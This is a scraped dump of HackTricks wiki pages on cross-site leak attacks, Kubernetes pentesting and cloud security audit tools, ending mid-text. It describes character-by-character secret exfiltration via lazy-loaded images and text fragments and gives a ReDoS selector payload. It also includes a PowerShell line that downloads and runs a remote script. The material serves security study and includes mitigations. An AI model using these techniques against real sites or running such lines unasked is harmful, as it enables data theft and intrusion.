page and measure the time it takes\n.\nManual Redirect\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Redirects\nMore info\n:\nttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234\n‚Äã\nSummary:\nIt's possible to find out if a response to a fetch request is a redirect\nCode Example\n:\nFetch with AbortController\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Timing\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller\n‚Äã\nSummary:\nIt's possible to try to load a resource and about before it's loaded the loading is interrupted. Depending on if an error is triggered, the resource was or wasn't cached.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller\n‚Äã\n‚Äã\nAbortController\ncould be combined with\nfetch\nand\nsetTimeout\nto both detect whether the\nresource is cached\nand to evict a specific resource from the browser cache. A nice feature of this technique is that the probing occurs without caching new content in the process.\nScript Pollution\nInclusion Methods\n: HTML Elements (script)\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/element-leaks/#script-tag\n‚Äã\nSummary:\nWhen a\ncross-origin script\nis included on a page it‚Äôs\nnot directly possible to read\nits contents. However, if a script\nuses any built-in functions\n, it‚Äôs possible to\noverwrite them\nand read their arguments which might\nleak valuable information\n.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/element-leaks/#script-tag\n‚Äã\nService Workers\nInclusion Methods\n: Pop-ups\nDetectable Difference\n: Page Content\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers\n‚Äã\nSummary:\nMeasure execution time of a web using service workers.\nCode Example\n:\n1.\nThe attacker registers a service worker in one of their domains (attacker.com).\n2.\nIn the main document, the attacker issues a navigation (window.open) to the target website and instructs the Service Worker to start a timer.\n3.\nWhen the new window starts loading, the attacker navigates the reference obtained in step 2 to a page handled by the Service Worker.\n4.\nWhen the request performed in step 3 arrives at the service worker, it returns a 204 (No Content) response, which aborts the navigation.\n5.\nAt this point, the Service Worker collects a measurement from the timer started in step 2. This measurement is affected by how long JavaScript blocked the navigation.\nIn an execution timing it's possible to\neliminate\nnetwork factors\nto obtain\nmore precise measurements\n. For example, by loading the resources used by the page before loading it.\nFetch Timing\nInclusion Methods\n: Fetch API\nDetectable Difference\n: Timing (generally due to Page Content, Status Code)\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks\n‚Äã\nSummary:\nThe\nperformance.now()\nAPI can be used to measure how much time it takes to perform a request. Other clocks could be used.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks\n‚Äã\nCross-Window Timing\nInclusion Methods\n: Pop-ups\nDetectable Difference\n: Timing (generally due to Page Content, Status Code)\nMore info\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks\n‚Äã\nSummary:\nThe\nperformance.now()\nAPI can be used to measure how much time it takes to perform a request using\nwindow.open\n. Other clocks could be used.\nCode Example\n:\nhttps://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nWith HTML or Re Injection\nHere you can find techniques to exfiltrate information from a cross-origin HTML\ninjecting HTML content\n. These techniques are interesting in cases where for any reason you can\ninject HTML but you cannot inject JS code\n.\nDangling Markup\nDangling Markup - HTML scriptless injection\nImage Lazy Loading\nIf you need to\nexfiltrate content\nand you can\nadd HTML previous to the secret\nyou should check the\ncommon dangling markup techniques\n.\nHowever, if for whatever reason you\nMUST\ndo it\nchar by char\n(maybe the communication is via a cache hit) you can use this trick.\nImages\nin HTML has a \"\nloading\n\" attribute whose value can be \"\nlazy\n\". In that case, the image will be loaded when it's viewed and not while the page is loading:\n<\nimg\nsrc\n=\n/something\nloading\n=\nlazy\n>\nTherefore, what you can do is to\nadd a lot of junk chars\n(For example\nthousands of \"W\"s\n) to\nfill the web page before the secret or add something like\n<br><canvas height=\"1850px\"></canvas><br>.\nThen if for example our\ninjection appear before the flag\n, the\nimage\nwould be\nloaded\n, but if appears\nafter\nthe\nflag\n, the flag + the junk will\nprevent it from being loaded\n(you will need to play with how much junk to place). This is what happened in\nthis writeup\n.\nAnother option would be to use the\nscroll-to-text-fragment\nif allowed:\nScroll-to-text-fragment\nHowever, you make the\nbot access the page\nwith something like\n#:~:text=SECR\nSo the web page will be something like:\nhttps://victim.com/post.html#:~:text=SECR\nWhere post.html contains the attacker junk chars and lazy load image and then the secret of the bot is added.\nWhat this text will do is to make the bot access any text in the page that contains the text\nSECR\n. As that text is the secret and it's just\nbelow the image\n, the\nimage will only load if the guessed secret is correct\n. So there you have your oracle to\nexfiltrate the secret char by char\n.\nSome code example to exploit this:\nhttps://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e\n‚Äã\nImage Lazy Loading Time Based\nIf it's\nnot possible to load an external image\nthat could indicate the attacker that the image was loaded, another option would be to try to\nguess the char several times and measure that\n. If the image is loaded all the requests would take longer that if the image isn't loaded. This is what was used in the\nsolution of this writeup\nsumarized here:\nEvent Loop Blocking + Lazy images\nReDoS\nRegular expression Denial of Service - ReDoS\nCSS ReDoS\nIf\njQuery(location.hash)\nis used, it's possible to find out via timing i\nf some HTML content exists\n, this is because if the selector\nmain[id='site-main']\ndoesn't match it doesn't need to check the rest of the\nselectors\n:\n$\n(\n\"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']\"\n)\nCSS Injection\nCSS Injection\nDefenses\nIn this section you can find part of the mitigations recommended in\nhttps://xsinator.com/paper.pdf\nhowever, there are more mitigations in each section of the wiki\nhttps://xsleaks.dev/\n. Take a look there for more information about how to protect against these techniques.\nInclusion Method Mitigations\nHTML elements\n. It can use the\nCORP header to control if pages can embed a resource\n. CORP can either be set to same-origin or same-site and blocks any cross-origin respectively cross-site requests to that resource. On the\nclient site\n, Chromium-based browsers use the\nCORB\nalgorithm to decide whether cross-origin resource requests should be allowed or denied.\nFrames\n. The main defense to\nprevent iframe\nelements from loading HTML resources is the usage of\nX-Frame-Options\n. Alternatively, the\nCSP directive frame-ancestors\ncan achieve a similar result. If the embedding is denied, the inclusion method cannot detect a difference in the responses.\nPop-ups\n. For restricting the access to\nwindow.opener\n, the\nCOOP HTTP response header\ndefines three different values: unsafe-none (default), same-origin-allow-popups, and same-origin. These values can be used to\nisolate browsing tabs and pop-ups\nand thus, mitigates leak techniques based on pop-ups.\nJavaScript Requests\n. Cross-origin JavaScript requests are often used in XS-Leak attacks, because an attacker has fine-grained control over the issued request. However, since these request are not CORS enabled they fall under the same restrictions as requests send by HTML elements, like scripts or images. Thus the impact of this leak technique can also be\nmitigated by CORP and CORB\n.\nMore generic methods:\nFetch Metadata\n. These request headers allow server owners to understand better how the user‚Äôs browser caused a specific request. In Chrome, Sec-Fetch-* headers are automatically added to each request and provide metadata about the request‚Äôs provenance. For example, Sec-Fetch-Dest: image was triggered from an image element. Web applications can then choose to block requests based on that information.\nSame-Site Cookies\n. The Same-Site cookie flag allows websites to declare\nwhether a cookie should be restricted to same-site or firstparty context\n. All major browsers support Same-Site cookies. In GC, cookies without the attribute are now Lax by default. For XS-Leaks,\nSame-Site cookies drastically limit the leak attack possibilities\n. On the other hand, leak techniques that rely on\nwindow.open\nstill work with\nSameSite=Lax\n. Websites that use\nother authentication\nmethods, such as client-side certificates and HTTP authentication,\nremain vulnerable\n.\nCross-Origin Identifier Unlinkability (COIU)\n. COIU, also known as First-Party Isolation (FPI), is an optional security feature that users can enable in FF‚Äôs expert settings (about:config) and was initially introduced in Tor Browser. In an abstract view, it is an extended same-site context. It\nbinds multiple resources\n(e.g., Cookies, Cache, Client-side storages)\nto the first-party\ninstead of sharing them among all visited websites. If enabled, COIU drastically decreases the applicability of XS-Leaks, since only methods using pop-ups are still possible to fit the policy‚Äôs first-party requirement.\nTracking Protections\n. Apple implemented a privacy mechanism called\nIntelligent Tracking Prevention (ITP)\nin SA that aims to combat cross-site tracking by limiting the capabilities of cookies and other web APIs. In newer versions of SA, ITP blocks all third-party cookies by default without any exceptions [74]. This blocking prevents all leaks that are not based on pop-ups. FF took a similar approach with Enhanced Tracking Prevention (ETP), but they only block specific third-party cookies belonging to tracking providers. In the context of XS-Leaks, ETP only mitigates leak techniques that target these tracking domains.\nBrowser Extensions\n. Security aware users can use\nbrowser extensions to prevent certain inclusion methods\n.\nLeak Technique Mitigations\nEvent Handler\n. The\nmost effective mitigation\non this leak technique would be to\ndeny them all\n, but this would break the majority of web applications on the Internet. We therefore propose to\nreduce the number of the necessary information that can be gathered within events\n. For example, the CSP violation event should not contain the redirection target URL in the blockedURI field. This behavior is implemented in FF and in newer versions of GC ‚Äì only SA remains vulnerable.\nError Messages\n. To mitigate XS-Leaks based on the leak technique error messages, there are two major requirements. First,\nerror messages must not contain detailed information\n, similarly to event handler messages. Second, browsers must\nminimize error message occurrences\n. XS-Leaks such as SRI Error, ContentDocument XFO, or Fetch Redirect detect whether an error message is thrown or not.\nGlobal Limits\n. Fixing leak techniques that abuse global limits are relatively complex because they rely on physical restrictions. The general recommendation thereby is to\nrestrict global limits on a small per-site basis\n. If the global limit is 1, like for the Payment API, the attacker can silently attempt to activate the WebPayment UI at any time, which only succeeds if the UI is not being used concurrently by any other tab. We recommend to only access to the Payment API when a trustworthy event was used. By this means, the global limit is set to zero unless the user provides consent like a left mouse click on a dialog window, which sets the global limit to one.\nGlobal State\n. Any\nproperties of a browser‚Äôs global state should not be accessible\n. For example, FF is the only browser that updates the global state history when a redirect occurs, which results in reading history.length. Browsers should create a new history property when a redirection occurs instead of storing it globally. Other examples are shared resources, such as caches. Cache leaks abuse the shared cache used for all open websites in a browser. To completely mitigate cache leak techniques, the HTTP cache must be partitioned on a per-site base, as implemented by SA, GC and FF. Note that in SA iframes are not effected by cache partitioning.\nPerformance API\n. We proved the Performance API to be an excellent leak technique. In many XS-Leaks, we could detect the difference whether a cross-origin request‚Äôs response has or has not a performance entry. As a unification, we recommend ensuring that all request must create such an entry and only the correct subset of timing information is recorded for cross-origin requests.\nReferences\n‚Äã\nhttps://xsinator.com/paper.pdf\n‚Äã\n‚Äã\nhttps://xsleaks.dev/\n‚Äã\n‚Äã\nhttps://github.com/xsleaks/xsleaks\n‚Äã\n‚Äã\nhttps://xsinator.com/\n‚Äã\n‚Äã\nhttps://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPentesting Web -\nPrevious\nXSSI (Cross-Site Script Inclusion)\nNext\nConnection Pool Examples\nLast modified\n2mo ago"
    },
    {
        "title": "Pentesting Kubernetes",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security",
        "text": "Kubernetes Pentesting\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nKubernetes Basics\nIf you don't know anything about Kubernetes this is a\ngood start\n. Read it to learn about the\narchitecture, components and basic actions\nin Kubernetes:\nKubernetes Basics\nLabs to practice and learn\n‚Äã\nhttps://securekubernetes.com/\n‚Äã\n‚Äã\nhttps://madhuakula.com/kubernetes-goat/index.html\n‚Äã\nHardening Kubernetes / Automatic Tools\nKubernetes Hardening\nManual Kubernetes Pentest\nFrom the Outside\nThere are several possible\nKubernetes services that you could find exposed\non the Internet (or inside internal networks). If you find them you know there is Kubernetes environment in there.\nDepending on the configuration and your privileges you might be able to abuse that environment, for more information:\nPentesting Kubernetes Services\nEnumeration inside a Pod\nIf you manage to\ncompromise a Pod\nread the following page to learn how to enumerate and try to\nescalate privileges/escape\n:\nAttacking Kubernetes from inside a Pod\nEnumerating Kubernetes with Credentials\nYou might have managed to compromise\nuser credentials, a user token or some service account toke\nn. You can use it to talk to the Kubernetes API service and try to\nenumerate it to learn more\nabout it:\nKubernetes Enumeration\nAnother important details about enumeration and Kubernetes permissions abuse is the\nKubernetes Role-Based Access Control (RBAC)\n. If you want to abuse permissions, you first should read about it here:\nKubernetes Role-Based Access Control(RBAC)\nKnowing about RBAC and having enumerated the environment you can now try to abuse the permissions with:\nAbusing Roles/ClusterRoles in Kubernetes\nPrivesc to a different Namespace\nIf you have compromised a namespace you can potentially escape to other namespaces with more interesting permissions/resources:\nKubernetes Namespace Escalation\nFrom Kubernetes to the Cloud\nIf you have compromised a K8s account or a pod, you might be able able to move to other clouds. This is because in clouds like AWS or GCP is possible to\ngive a K8s SA permissions over the cloud\n.\nKubernetes Pivoting to Clouds\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting Cloud -\nPrevious\nPentesting Cloud Methodology\nNext\nKubernetes Basics\nLast modified\n3mo ago"
    },
    {
        "title": "Pentesting Cloud (AWS, GCP, Az...)",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology",
        "text": "Pentesting Cloud Methodology\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Methodology\nEach cloud has its own peculiarities but in general there are a few\ncommon things a pentester should check\nwhen testing a cloud environment:\nBenchmark checks\nThis will help you\nunderstand the size\nof the environment and\nservices used\nIt will allow you also to find some\nquick misconfigurations\nas you can perform most of this tests with\nautomated tools\nServices Enumeration\nYou probably won't find much more misconfigurations here if you performed correctly the benchmark tests, but you might find some that weren't being looked for in the benchmark test.\nThis will allow you to know\nwhat is exactly being used\nin the cloud env\nThis will help a lot in the next steps\nCheck exposed assets\nThis can be done during the previous section, you need to\nfind out everything that is potentially exposed\nto the Internet somehow and how can it be accessed.\nHere I'm taking\nmanually exposed infrastructure\nlike instances with web pages or other ports being exposed, and also about other\ncloud managed services that can be configured\nto be exposed (such as DBs or buckets)\nThen you should check\nif that resource can be exposed or not\n(confidential information? vulnerabilities? misconfigurations in the exposed service?)\nCheck permissions\nHere you should\nfind out all the permissions of each role/user\ninside the cloud and how are they used\nToo\nmany highly privileged\n(control everything) accounts? Generated keys not used?... Most of these check should have been done in the benchmark tests already\nIf the client is using OpenID or SAML or other\nfederation\nyou might need to ask them for further\ninformation\nabout\nhow is being each role assigned\n(it's not the same that the admin role is assigned to 1 user or to 100)\nIt's\nnot enough to find\nwhich users has\nadmin\npermissions \"*:*\". There are a lot of\nother permissions\nthat depending on the services used can be very\nsensitive\n.\nMoreover, there are\npotential privesc\nways to follow abusing permissions. All this things should be taken into account and\nas much privesc paths as possible\nshould be reported.\nCheck Integrations\nIt's highly probably that\nintegrations with other clouds or SaaS\nare being used inside the cloud env.\nFor\nintegrations of the cloud you are auditing\nwith other platform you should notify\nwho has access to (ab)use that integration\nand you should ask\nhow sensitive\nis the action being performed.\nFor example, who can write in an AWS bucket where GCP is getting data from (ask how sensitive is the action in GCP treating that data).\nFor\nintegrations inside the cloud you are auditing\nfrom external platforms, you should ask\nwho has access externally to (ab)use that integration\nand check how is that data being used.\nFor example, if a service is using a Docker image hosted in GCR, you should ask who has access to modify that and which sensitive info and access will get that image when executed inside an AWS cloud.\nMulti-Cloud tools\nThere are several tools that can be used to test different cloud environments. The installation steps and links are going to be indicated in this section.\n‚Äã\nPurplePanda\n‚Äã\nA tool to\nidentify bad configurations and privesc path in clouds and across clouds/SaaS.\nInstall\nGCP\n# You need to install and run neo4j also\ngit\nclone https://github.com/carlospolop/PurplePanda\ncd\nPurplePanda\npython3\n-m\nvenv\n.\nsource\nbin/activate\npython3\n-m\npip\ninstall\n-r\nrequirements.txt\nexport\nPURPLEPANDA_NEO4J_URL\n=\n\"bolt://neo4j@localhost:7687\"\nexport\nPURPLEPANDA_PWD\n=\n\"neo4j_pwd_4_purplepanda\"\npython3 main.py\n-h\n# Get help\nexport\nGOOGLE_DISCOVERY\n=\n$(\necho\n'google:\n- file_path: \"\"\n‚Äã\n- file_path: \"\"\nservice_account_id: \"\n[email¬†protected]\n\"'\n|\nbase64\n)\n‚Äã\npython3 main.py\n-a\n-p\ngoogle\n#Get basic info of the account to check it's correctly configured\npython3 main.py\n-e\n-p\ngoogle\n#Enumerate the env\n‚Äã\nProwler\n‚Äã\nIt supports\nAWS, GCP & Azure\n. Check how to configure each provider in\nhttps://docs.prowler.cloud/en/latest/#aws\n‚Äã\n# Install\npip\ninstall\nprowler\nprowler\n-v\n‚Äã\n# Run\nprowler\n<\nprovider\n>\n# Example\nprowler aws\n--profile\ncustom-profile\n[\n-M csv json json-asff html\n]\n‚Äã\n# Get info about checks & services\nprowler\n<\nprovider\n>\n--list-checks\nprowler\n<\nprovider\n>\n--list-services\n‚Äã\nCloudSploit\n‚Äã\nAWS, Azure, Github, Google, Oracle, Alibaba\nInstall\nGCP\n# Install\ngit\nclone https://github.com/aquasecurity/cloudsploit.git\ncd\ncloudsploit\nnpm\ninstall\n./index.js\n-h\n## Docker instructions in github\n## You need to have creds for a service account and set them in config.js file\n./index.js\n--cloud\ngoogle\n--config\n<\n/abs/path/to/config.js\n>\n‚Äã\nScoutSuite\n‚Äã\nAWS, Azure, GCP, Alibaba Cloud, Oracle Cloud Infrastructure\nInstall\nGCP\nmkdir\nscout\n;\ncd\nscout\nvirtualenv\n-p\npython3 venv\nsource\nvenv/bin/activate\npip\ninstall\nscoutsuite\nscout\n--help\n## Using Docker: https://github.com/nccgroup/ScoutSuite/wiki/Docker-Image\nscout gcp --report-dir /tmp/gcp --user-account --all-projects\n## use \"--service-account KEY_FILE\" instead of \"--user-account\" to use a service account\n‚Äã\nSCOUT_FOLDER_REPORT\n=\n\"/tmp\"\nfor\npid\nin\n$(\ngcloud projects list\n--format\n=\n\"value(projectId)\"\n)\n;\ndo\necho\n\"================================================\"\necho\n\"Checking\n$pid\n\"\nmkdir\n\"\n$SCOUT_FOLDER_REPORT\n/\n$pid\n\"\nscout gcp --report-dir\n\"\n$SCOUT_FOLDER_REPORT\n/\n$pid\n\"\n--no-browser --user-account --project-id\n\"\n$pid\n\"\ndone\n‚Äã\nSteampipe\n‚Äã\nInstall\nGCP\nAWS\nDownload and install Steampipe (\nhttps://steampipe.io/downloads\n). Or use Brew:\nbrew tap turbot/tap\nbrew install steampipe\n# Install gcp plugin\nsteampipe plugin\ninstall\ngcp\n‚Äã\n# Use https://github.com/turbot/steampipe-mod-gcp-compliance.git\ngit\nclone https://github.com/turbot/steampipe-mod-gcp-compliance.git\ncd\nsteampipe-mod-gcp-compliance\n# To run all the checks from the dashboard\nsteampipe dashboard\n# To run all the checks from rhe cli\nsteampipe check all\nCheck all Projects\nIn order to check all the projects you need to generate the\ngcp.spc\nfile indicating all the projects to test. You can just follow the indications from the following script\nFILEPATH\n=\n\"/tmp/gcp.spc\"\nrm\n-rf\n\"\n$FILEPATH\n\"\n2\n>\n/dev/null\n‚Äã\n# Generate a json like object for each project\nfor\npid\nin\n$(\ngcloud projects list\n--format\n=\n\"value(projectId)\"\n)\n;\ndo\necho\n\"connection\n\\\"\ngcp_\n$(\necho\n-n\n$pid\n|\ntr\n\"-\"\n\"_\"\n)\n\\\"\n{\nplugin  =\n\\\"\ngcp\n\\\"\nproject =\n\\\"\n$pid\n\\\"\n}\"\n>>\n\"\n$FILEPATH\n\"\ndone\n‚Äã\n# Generate the aggragator to call\necho\n'connection \"gcp_all\" {\nplugin      = \"gcp\"\ntype        = \"aggregator\"\nconnections = [\"gcp_*\"]\n}'\n>>\n\"\n$FILEPATH\n\"\n‚Äã\necho\n\"Copy\n$FILEPATH\nin ~/.steampipe/config/gcp.spc if it was correctly generated\"\nTo check\nother GCP insights\n(useful for enumerating services) use:\nhttps://github.com/turbot/steampipe-mod-gcp-insights\n‚Äã\nTo check Terraform GCP code:\nhttps://github.com/turbot/steampipe-mod-terraform-gcp-compliance\n‚Äã\nMore GCP plugins of Steampipe:\nhttps://github.com/turbot?q=gcp\n‚Äã\n# Install aws plugin\nsteampipe plugin\ninstall\naws\n‚Äã\n# Modify the spec indicating in \"profile\" the profile name to use\nnano\n~/.steampipe/config/aws.spc\n‚Äã\n# Get some info on how the AWS account is being used\ngit\nclone https://github.com/turbot/steampipe-mod-aws-insights.git\ncd\nsteampipe-mod-aws-insights\nsteampipe dashboard\n‚Äã\n# Get the services exposed to the internet\ngit\nclone https://github.com/turbot/steampipe-mod-aws-perimeter.git\ncd\nsteampipe-mod-aws-perimeter\nsteampipe dashboard\n‚Äã\n# Run the benchmarks\ngit\nclone https://github.com/turbot/steampipe-mod-aws-compliance\ncd\nsteampipe-mod-aws-compliance\nsteampipe dashboard\n# To see results in browser\nsteampipe check all\n--export\n=\n/tmp/output4.json\nTo check Terraform AWS code:\nhttps://github.com/turbot/steampipe-mod-terraform-aws-compliance\n‚Äã\nMore AWS plugins of Steampipe:\nhttps://github.com/orgs/turbot/repositories?q=aws\n‚Äã\n‚Äã\ncs-suite\n‚Äã\nAWS, GCP, Azure, DigitalOcean.\nIt requires python2.7 and looks unmaintained.\nNessus\nNessus has an\nAudit Cloud Infrastructure\nscan supporting: AWS, Azure, Office 365, Rackspace, Salesforce. Some extra configurations in\nAzure\nare needed to obtain a\nClient Id\n.\n‚Äã\ncloudlist\n‚Äã\nCloudlist is a\nmulti-cloud tool for getting Assets\n(Hostnames, IP Addresses) from Cloud Providers.\nCloudlist\nSecond Tab\ncd\n/tmp\nwget\nhttps://github.com/projectdiscovery/cloudlist/releases/latest/download/cloudlist_1.0.1_macOS_arm64.zip\nunzip\ncloudlist_1.0.1_macOS_arm64.zip\nchmod\n+x cloudlist\nsudo\nmv\ncloudlist /usr/local/bin\n## For GCP it requires service account JSON credentials\ncloudlist\n-config\n<\n/path/to/config\n>\n‚Äã\ncartography\n‚Äã\nCartography is a Python tool that consolidates infrastructure assets and the relationships between them in an intuitive graph view powered by a Neo4j database.\nInstall\nGCP\n# Installation\ndocker\nimage pull ghcr.io/lyft/cartography\ndocker\nrun\n--platform\nlinux/amd64 ghcr.io/lyft/cartography cartography\n--help\n## Install a Neo4j DB version 3.5.*\ndocker\nrun\n--platform\nlinux/amd64\n\\\n--volume\n\"\n$HOME\n/.config/gcloud/application_default_credentials.json:/application_default_credentials.json\"\n\\\n-e\nGOOGLE_APPLICATION_CREDENTIALS\n=\n\"/application_default_credentials.json\"\n\\\n-e\nNEO4j_PASSWORD\n=\n\"s3cr3t\"\n\\\nghcr.io/lyft/cartography\n\\\n--neo4j-uri bolt://host.docker.internal:7687\n\\\n--neo4j-password-env-var NEO4j_PASSWORD\n\\\n--neo4j-user neo4j\n‚Äã\n‚Äã\n# It only checks for a few services inside GCP (https://lyft.github.io/cartography/modules/gcp/index.html)\n## Cloud Resource Manager\n## Compute\n## DNS\n## Storage\n## Google Kubernetes Engine\n### If you can run starbase or purplepanda you will get more info\n‚Äã\nstarbase\n‚Äã\nStarbase collects assets and relationships from services and systems including cloud infrastructure, SaaS applications, security controls, and more into an intuitive graph view backed by the Neo4j database.\nInstall\nGCP\n# You are going to need Node version 14, so install nvm following https://tecadmin.net/install-nvm-macos-with-homebrew/\nnpm\ninstall\n--global\nyarn\nnvm\ninstall\n14\ngit\nclone https://github.com/JupiterOne/starbase.git\ncd\nstarbase\nnvm use\n14\nyarn\ninstall\nyarn\nstarbase\n--help\n# Configure manually config.yaml depending on the env to analyze\nyarn\nstarbase setup\nyarn\nstarbase run\n‚Äã\n# Docker\ngit\nclone https://github.com/JupiterOne/starbase.git\ncd\nstarbase\ncp\nconfig.yaml.example config.yaml\n# Configure manually config.yaml depending on the env to analyze\ndocker\nbuild --no-cache\n-t\nstarbase:latest\n.\ndocker-compose\nrun starbase setup\ndocker-compose\nrun starbase run\n## Config for GCP\n### Check out: https://github.com/JupiterOne/graph-google-cloud/blob/main/docs/development.md\n### It requires service account credentials\nintegrations\n:\n-\nname\n:\ngraph\n-\ngoogle\n-\ncloud\ninstanceId\n:\ntestInstanceId\ndirectory\n:\n./.integrations/graph\n-\ngoogle\n-\ncloud\ngitRemoteUrl\n:\nhttps\n:\n//github.com/JupiterOne/graph\n-\ngoogle\n-\ncloud.git\nconfig\n:\nSERVICE_ACCOUNT_KEY_FILE\n:\n'{Check https://github.com/JupiterOne/graph-google-cloud/blob/main/docs/development.md#service_account_key_file-string}'\nPROJECT_ID\n:\n\"\"\nFOLDER_ID\n:\n\"\"\nORGANIZATION_ID\n:\n\"\"\nCONFIGURE_ORGANIZATION_PROJECTS\n:\nfalse\n‚Äã\nstorage\n:\nengine\n:\nneo4j\nconfig\n:\nusername\n:\nneo4j\npassword\n:\ns3cr3t\nuri\n:\nbolt\n:\n//localhost\n:\n7687\n#Consider using host.docker.internal if from docker\n‚Äã\nSkyArk\n‚Äã\nDiscover the most privileged users in the scanned AWS or Azure environment, including the AWS Shadow Admins. It uses powershell.\nImport-Module\n.\n\\SkyArk\n.\nps1\n-\nforce\nStart-AzureStealth\n‚Äã\n# in the Cloud Console\nIEX\n(\nNew-Object\nNet\n.\nWebClient\n).\nDownloadString\n(\n'https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1'\n)\nScan-AzureAdmins\n‚Äã\nCloud Brute\n‚Äã\nA tool to find a company (target) infrastructure, files, and apps on the top cloud providers (Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, Linode).\n‚Äã\nCloudFox\n‚Äã\nCloudFox is a tool to find exploitable attack paths in cloud infrastructure (currently only AWS & Azure supported with GCP upcoming).\nIt is an enumeration tool which is intended to compliment manual pentesting.\nIt doesn't create or modify any data within the cloud environment.\nMore lists of cloud security tools\n‚Äã\nhttps://github.com/RyanJarv/awesome-cloud-sec\n‚Äã\nGoogle\nGCP\nGCP Pentesting\nWorkspace\nWorkspace Pentesting\nAWS\nAWS Pentesting\nAzure\nAccess the portal here:\nhttp://portal.azure.com/\nTo start the tests you should have access with a user with\nReader permissions over the subscription\nand\nGlobal Reader role in AzureAD\n. If even in that case you are\nnot able to access the content of the Storage accounts\nyou can fix it with the\nrole Storage Account Contributor\n.\nIt is recommended to\ninstall azure-cli\nin a\nlinux\nand\nwindows\nvirtual machines (to be able to run powershell and python scripts):\nhttps://docs.microsoft.com/en-us/cli/azure/install-azure-cli?view=azure-cli-latest\nThen, run\naz login\nto login. Note the\naccount information\nand\ntoken\nwill be\nsaved\ninside\n<HOME>/.azure\n(in both Windows and Linux).\nRemember that if the\nSecurity Centre Standard Pricing Tier\nis being used and\nnot\nthe\nfree\ntier, you can\ngenerate\na\nCIS compliance scan report\nfrom the azure portal. Go to\nPolicy & Compliance-> Regulatory Compliance\n(or try to access\nhttps://portal.azure.com/#blade/Microsoft_Azure_Security/SecurityMenuBlade/22\n).\n__If the company is not paying for a Standard account you may need to review the\nCIS Microsoft Azure Foundations Benchmark\nby \"hand\" (you can get some help using the following tools). Download it from\nhere\n.\nRun scanners\nRun the scanners to look for\nvulnerabilities\nand\ncompare\nthe security measures implemented with\nCIS\n.\npip\ninstall\nscout\nscout azure\n--cli\n--report-dir\n<\noutput_dir\n>\n‚Äã\n#Fix azureaudit.py before launching cs.py\n#Adding \"j_res = {}\" on line 1074\npython cs.py\n-env\nazure\n‚Äã\n#Azucar is an Azure security scanner for PowerShell 